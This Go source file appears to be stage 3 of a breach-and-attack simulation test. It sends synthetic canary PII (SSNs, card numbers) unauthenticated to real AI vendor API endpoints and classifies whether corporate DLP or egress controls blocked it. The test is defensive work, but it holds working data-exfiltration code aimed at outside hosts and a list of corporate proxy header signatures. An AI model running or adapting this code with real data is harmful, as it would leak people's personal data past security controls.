// Stage 3 — Exfiltration to External Inference Services
// Technique: T1567 (Exfiltration Over Web Service)
//
// Reads the canary PII payload staged by Stage 2 (falls back to generating its own
// if run standalone) and POSTs it over real TLS, unauthenticated, to real AI vendor
// hosts (OpenAI, Anthropic, Gemini, Copilot). For each attempt it classifies the
// outcome using the integrity-critical logic in classifyEgress (see spec §4 and
// CLAUDE.md Bug Prevention Rule 8).
//
// SAFETY: no Authorization/API-key header is ever sent — hosts are hit
// unauthenticated (spec §6.2). Records are synthetic canaries (canary.go).
//
// CLASSIFICATION PRINCIPLE (load-bearing): key on WHO answered, not on status code.
//   - Any HTTP response over a TLS session that VALIDATES to the real vendor —
//     including a vendor 401/403 at its auth layer — means the bytes crossed the
//     boundary. That is a LEAK, never a block.
//   - A block requires positive evidence that *the org's* control intervened: a
//     vendor host resolving to a sinkhole/RFC1918/loopback, a TLS-interception
//     certificate error, or a proxy connection refused/reset to a public IP.
//   - Anything ambiguous defaults to error (999) — NEVER to a block code.
//
// Exit codes: 0 = PII LEAKED to >=1 vendor, 126 = an org control intervened
//             (no leak occurred), 999 = prerequisite/ambiguous (inconclusive).

//go:build windows || linux

package main

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

const (
	TEST_UUID      = "6d33cc62-d59d-4661-a76d-715aa4abddfd"
	TECHNIQUE_ID   = "T1567"
	TECHNIQUE_NAME = "Exfiltration to External Inference Services"
	STAGE_ID       = 3
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// Per-host classification verdicts.
const (
	verdictLeak  = "leak"
	verdictBlock = "block"
	verdictError = "error"
)

// vendorTarget describes one real AI inference endpoint.
type vendorTarget struct {
	Name        string
	Host        string
	URL         string
	ContentType string
	// buildBody renders a vendor-shaped chat-completion body embedding the PII text.
	buildBody func(text string) []byte
}

// egressResult captures the classified outcome of one exfil attempt.
type egressResult struct {
	Vendor   string
	Verdict  string
	Evidence string
}

func vendorTargets() []vendorTarget {
	return []vendorTarget{
		{
			Name: "OpenAI", Host: "api.openai.com",
			URL: "https://api.openai.com/v1/chat/completions", ContentType: "application/json",
			buildBody: func(t string) []byte {
				return []byte(fmt.Sprintf(`{"model":"gpt-4o","messages":[{"role":"user","content":%q}]}`, t))
			},
		},
		{
			Name: "Anthropic", Host: "api.anthropic.com",
			URL: "https://api.anthropic.com/v1/messages", ContentType: "application/json",
			buildBody: func(t string) []byte {
				return []byte(fmt.Sprintf(`{"model":"claude-3-5-sonnet-20241022","max_tokens":256,"messages":[{"role":"user","content":%q}]}`, t))
			},
		},
		{
			Name: "Gemini", Host: "generativelanguage.googleapis.com",
			URL: "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent", ContentType: "application/json",
			buildBody: func(t string) []byte {
				return []byte(fmt.Sprintf(`{"contents":[{"parts":[{"text":%q}]}]}`, t))
			},
		},
		{
			Name: "Copilot", Host: "api.githubcopilot.com",
			URL: "https://api.githubcopilot.com/chat/completions", ContentType: "application/json",
			buildBody: func(t string) []byte {
				return []byte(fmt.Sprintf(`{"model":"gpt-4","messages":[{"role":"user","content":%q}]}`, t))
			},
		},
	}
}

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))

	code, detail := runStage()

	switch code {
	case StageSuccess:
		LogMessage("SUCCESS", TECHNIQUE_ID, detail)
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", detail)
	case StageBlocked, StageQuarantined:
		LogMessage("WARN", TECHNIQUE_ID, detail)
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, detail)
	default:
		LogMessage("ERROR", TECHNIQUE_ID, detail)
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", detail)
	}
	os.Exit(code)
}

func runStage() (int, string) {
	// Load the payload Stage 2 staged; fall back to a fresh canary set if standalone.
	var payload PIIPayload
	if p, err := ReadPayload(PayloadPath()); err == nil {
		payload = p
	} else {
		marker := GenerateRunMarker()
		payload = PIIPayload{
			Marker:      marker,
			GeneratedAt: time.Now().UTC().Format(time.RFC3339),
			Records:     GenerateCanarySet(10, marker),
		}
		LogMessage("INFO", TECHNIQUE_ID, "No staged payload found; generated a standalone canary set")
	}

	if len(payload.Records) == 0 {
		return StageError, "no canary records available to exfiltrate (prerequisite not met)"
	}

	text := renderExfilText(payload)
	targets := vendorTargets()

	Endpoint.Say("    [*] Attempting canary-PII egress to %d inference services (marker=%s)...", len(targets), payload.Marker)

	results := make([]egressResult, 0, len(targets))
	for _, tgt := range targets {
		res := classifyEgress(tgt, text)
		results = append(results, res)
		Endpoint.Say("        - %-10s => %-6s (%s)", tgt.Name, strings.ToUpper(res.Verdict), res.Evidence)
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("%s: %s — %s", tgt.Name, res.Verdict, res.Evidence))
	}

	// Aggregate — LEAK DOMINATES. If any vendor received the PII, the honest verdict
	// is that data escaped, even if another egress path was blocked. Returning a
	// "protected" (126) verdict while data leaked would be a false reassurance
	// (CLAUDE.md Rule 8). Only when NOTHING leaked AND a control positively fired do
	// we report protected. Otherwise the run is inconclusive (999).
	leaks, blocks, errs := 0, 0, 0
	var leakVendors, blockVendors []string
	for _, r := range results {
		switch r.Verdict {
		case verdictLeak:
			leaks++
			leakVendors = append(leakVendors, r.Vendor)
		case verdictBlock:
			blocks++
			blockVendors = append(blockVendors, r.Vendor)
		default:
			errs++
		}
	}

	switch {
	case leaks > 0:
		return StageSuccess, fmt.Sprintf("Canary PII reached %d/%d vendor(s): %s (marker=%s)",
			leaks, len(targets), strings.Join(leakVendors, ", "), payload.Marker)
	case blocks > 0:
		return StageBlocked, fmt.Sprintf("All egress attempts stopped by org controls; positive block evidence at: %s",
			strings.Join(blockVendors, ", "))
	default:
		return StageError, fmt.Sprintf("No leak and no affirmative block evidence across %d vendor(s); %d inconclusive result(s)",
			len(targets), errs)
	}
}

// renderExfilText builds the sensitive-looking prompt content embedding canary PII.
func renderExfilText(p PIIPayload) string {
	var b strings.Builder
	b.WriteString("Please de-duplicate and summarize these customer records. ")
	b.WriteString(fmt.Sprintf("[trace-marker: %s]\n", p.Marker))
	b.WriteString("full_name,email,ssn,pan\n")
	for _, r := range p.Records {
		b.WriteString(fmt.Sprintf("%s,%s,%s,%s\n", r.FullName, r.Email, r.SSN, r.PAN))
	}
	return b.String()
}

// classifyEgress performs one exfil attempt and classifies the outcome. This is the
// integrity-critical function. It NEVER defaults to a block code.
func classifyEgress(tgt vendorTarget, text string) egressResult {
	// --- Step A: DNS. A vendor host resolving to loopback / RFC1918 / link-local /
	// unspecified is a DNS sinkhole or internal redirect — positive block evidence. ---
	ips, err := net.LookupIP(tgt.Host)
	if err != nil {
		// DNS failure is ambiguous (no network, NXDOMAIN, resolver down) — not a block.
		return egressResult{tgt.Name, verdictError, fmt.Sprintf("DNS resolution failed: %v", err)}
	}
	for _, ip := range ips {
		if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsUnspecified() {
			return egressResult{tgt.Name, verdictBlock,
				fmt.Sprintf("vendor host resolved to non-routable %s (DNS sinkhole/redirect by an org control)", ip.String())}
		}
	}

	// --- Step B: HTTPS POST, unauthenticated, default TLS verification ON. ---
	// No Authorization header is set (spec §6.2 — hosts hit unauthenticated).
	client := &http.Client{
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // inspect 3xx ourselves
		},
	}

	req, rerr := http.NewRequest(http.MethodPost, tgt.URL, bytes.NewReader(tgt.buildBody(text)))
	if rerr != nil {
		return egressResult{tgt.Name, verdictError, fmt.Sprintf("could not build request: %v", rerr)}
	}
	req.Header.Set("Content-Type", tgt.ContentType)
	req.Header.Set("User-Agent", "ai-assistant-helper/1.0")

	resp, derr := client.Do(req)
	if derr != nil {
		return classifyTransportError(tgt, derr)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))

	// --- Step C: we received an HTTP response over a validated TLS session. ---
	// (If TLS verification had failed, client.Do would have returned an error handled
	//  above. Reaching here means the peer presented a certificate that validated for
	//  tgt.Host against the local trust store.)

	// == BEGIN TODO(user-adjudication) — three ambiguous edge cases (spec §4) ==
	// These branches are intentionally left defaulting to 999 (inconclusive). The
	// user must decide their final mapping; do NOT guess. Trade-offs noted per case.

	// (g) Captive-portal / SSO redirect: a 3xx to a host outside the vendor domain.
	// Trade-off: a same-domain 3xx from the vendor is the vendor answering (a leak),
	// but a redirect to an unrelated login/portal host suggests interception. We
	// cannot be certain the request body was NOT already forwarded before the
	// redirect, so mapping this to "block" could hide a real leak. Defaulting to 999.
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		if loc := resp.Header.Get("Location"); loc != "" && !sameVendorDomain(loc, tgt.Host) {
			// TODO(user-adjudication): decide leak vs block for captive-portal/SSO redirect.
			return egressResult{tgt.Name, verdictError,
				fmt.Sprintf("HTTP %d redirect to non-vendor host %q — captive-portal/SSO? (ambiguous, awaiting adjudication)", resp.StatusCode, redactHost(loc))}
		}
	}

	// (f) Transparent MITM proxy that IS the org DLP, returning 200 after stripping/
	// redacting PII, using a corporate root the local trust store already trusts (so
	// TLS validation passed). Trade-off: keying on proxy headers risks false positives
	// on benign CDN headers (OpenAI/Anthropic sit behind Cloudflare, which may emit
	// Via/X-Cache), which would MISCLASSIFY a real leak as inconclusive. We therefore
	// match only a narrow set of known corporate-DLP header signatures, and still
	// default to 999 rather than block. The user decides the final mapping.
	if sig := interceptionProxyHeader(resp.Header); sig != "" {
		// TODO(user-adjudication): decide leak vs block for transparent-MITM 200 w/ DLP header.
		return egressResult{tgt.Name, verdictError,
			fmt.Sprintf("HTTP %d carrying corporate-proxy signature %q — transparent MITM? (ambiguous, awaiting adjudication)", resp.StatusCode, sig)}
	}
	// == END TODO(user-adjudication) ==

	// (d) UNAMBIGUOUS LEAK: a validated response from the real vendor at ANY status,
	// including 401/403 at the vendor's auth layer. The bytes crossed the boundary.
	return egressResult{tgt.Name, verdictLeak,
		fmt.Sprintf("HTTP %d from validated vendor endpoint (%d bytes) — PII crossed the boundary", resp.StatusCode, len(body))}
}

// classifyTransportError maps a client.Do transport error to a verdict. It only
// returns "block" on positive interception evidence; ambiguous errors map to "error".
func classifyTransportError(tgt vendorTarget, err error) egressResult {
	msg := strings.ToLower(err.Error())

	// (b) TLS-interception: the real vendor cert is publicly trusted, so a verification
	// failure means something re-signed the connection — an inline TLS-inspection proxy.
	if strings.Contains(msg, "x509") ||
		strings.Contains(msg, "certificate signed by unknown authority") ||
		strings.Contains(msg, "certificate is valid for") ||
		strings.Contains(msg, "tls: failed to verify") {
		return egressResult{tgt.Name, verdictBlock,
			fmt.Sprintf("TLS certificate verification failed on a public vendor host (TLS-inspection proxy): %v", err)}
	}

	// (c) Inline proxy refused/reset the connection to a public vendor IP.
	if strings.Contains(msg, "connection refused") ||
		strings.Contains(msg, "connection reset") ||
		strings.Contains(msg, "reset by peer") ||
		strings.Contains(msg, "forcibly closed") {
		return egressResult{tgt.Name, verdictBlock,
			fmt.Sprintf("TCP connection refused/reset to a public vendor IP (inline egress proxy): %v", err)}
	}

	// (h) TODO(user-adjudication): connection timeout with no RST — could be a silent
	// egress-firewall drop OR ordinary vendor slowness. We cannot distinguish from the
	// client side, so this defaults to 999 (inconclusive), NOT a block. The user decides.
	if strings.Contains(msg, "timeout") ||
		strings.Contains(msg, "deadline exceeded") ||
		strings.Contains(msg, "client.timeout") {
		return egressResult{tgt.Name, verdictError,
			fmt.Sprintf("connection timed out with no reset — silent drop vs. vendor slowness (ambiguous, awaiting adjudication): %v", err)}
	}

	// Everything else (no route, DNS-in-dial, etc.) is ambiguous — never a block.
	return egressResult{tgt.Name, verdictError, fmt.Sprintf("unrecognized transport outcome (inconclusive): %v", err)}
}

// interceptionProxyHeader returns a non-empty signature string if the response carries
// a header characteristic of a known corporate DLP/secure-web-gateway. It deliberately
// avoids generic CDN headers (Via, X-Cache) to limit false positives on real vendors.
func interceptionProxyHeader(h http.Header) string {
	corporateSignatures := []string{
		"X-Zscaler", "X-Zscaler-Auth", "X-Bluecoat-Via", "X-Forcepoint",
		"X-Netskope-Policy", "X-Cisco-Umbrella", "X-Ns-Proxy", "X-Iboss",
		"X-Symantec-Wss", "X-Menlo-Isolation",
	}
	for _, sig := range corporateSignatures {
		if h.Get(sig) != "" {
			return sig
		}
	}
	return ""
}

// sameVendorDomain reports whether a redirect Location stays within the vendor's domain.
func sameVendorDomain(location, vendorHost string) bool {
	u, err := url.Parse(location)
	if err != nil || u.Host == "" {
		// Relative redirect (same host) — treat as same domain.
		return true
	}
	rh := strings.ToLower(u.Hostname())
	vh := strings.ToLower(vendorHost)
	if rh == vh {
		return true
	}
	// Compare registrable-ish suffix (last two labels).
	return regDomain(rh) == regDomain(vh)
}

func regDomain(host string) string {
	parts := strings.Split(host, ".")
	if len(parts) < 2 {
		return host
	}
	return parts[len(parts)-2] + "." + parts[len(parts)-1]
}

// redactHost returns only the host of a URL for logging (never log full redirect URLs).
func redactHost(location string) string {
	if u, err := url.Parse(location); err == nil && u.Host != "" {
		return u.Host
	}
	return "<unparseable>"
}
